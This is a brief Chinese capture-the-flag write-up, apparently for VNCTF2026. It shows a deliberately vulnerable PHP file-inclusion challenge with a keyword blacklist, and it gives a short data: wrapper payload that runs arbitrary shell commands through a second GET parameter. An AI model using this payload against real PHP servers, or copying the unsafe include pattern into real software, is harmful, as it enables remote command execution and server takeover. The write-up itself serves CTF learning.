---
title: "VNCTF2026"
draft: false
---
- [MISC](#misc)
  * [welcome to vnctf](#welcome-to-vnctf)
- [WEB](#web)
  * [sign in](#sign-in)

---

# MISC

## welcome to vnctf

直接在官网看源代码

# WEB

## sign in

```plain
<?php
highlight_file(__FILE__);

$blacklist = ['/', 'convert', 'base', 'text', 'plain'];

$file = $_GET['file'];

foreach ($blacklist as $banned) {
    if (strpos($file, $banned) !== false) {
        die("这个是不允许的哦~");
    }
}

if (isset($file) && strlen($file) <= 20){
    include $file;
};
```

发现禁用了/，有两种思路，第一种使用控制字符，第二种是用伪协议绕过

伪协议中有data:,这种可以直接使用代码的形式，所以直接用这个就行了

之后就是如何在20字符以内写出代码

直接输出根目录肯定是不行了，那就调用另外一个GET函数

所以payload是`data:,<?=`$\_GET\[a]`;`

至于a写什么随便

